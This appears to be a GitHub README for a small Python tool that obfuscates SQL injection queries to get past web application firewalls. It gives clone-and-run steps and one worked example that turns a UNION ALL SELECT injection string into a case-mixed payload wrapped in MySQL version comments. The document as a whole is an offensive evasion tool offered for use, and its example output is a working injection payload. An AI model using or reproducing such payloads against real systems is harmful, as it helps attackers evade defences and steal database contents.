# Basic WAF bypass
Simplest way to edit your string so they can bypass the WAF and copy it.

## HOW TO USE
    sudo apt install git
    git clone https://github.com/Tecosse/basic-waf-bypass.git
    cd ./basic-waf-bypass/
    python3 ./main.py
>  
**The query must look like something like this: 'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10'**


**Enter a string:** UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10

> This will return the following string:

`/*!5000UNioN*/+/*!5000ALL*/+/*!5000seLEcT*/+/*!50001,2,3,4,5,6,7,8,9,10*/+--`
